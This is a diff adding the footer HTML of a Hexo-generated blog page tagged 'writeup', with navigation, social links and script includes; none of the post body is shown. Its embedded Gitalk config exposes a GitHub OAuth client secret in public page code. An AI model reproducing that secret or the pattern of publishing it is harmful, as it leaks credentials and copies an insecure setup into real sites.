+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/05/12/buu-pwn/" rel="prev" title="buu-pwn">
+                  <i class="fa fa-chevron-left"></i> buu-pwn
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"a92568f43d20d104120157d7d739b555"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
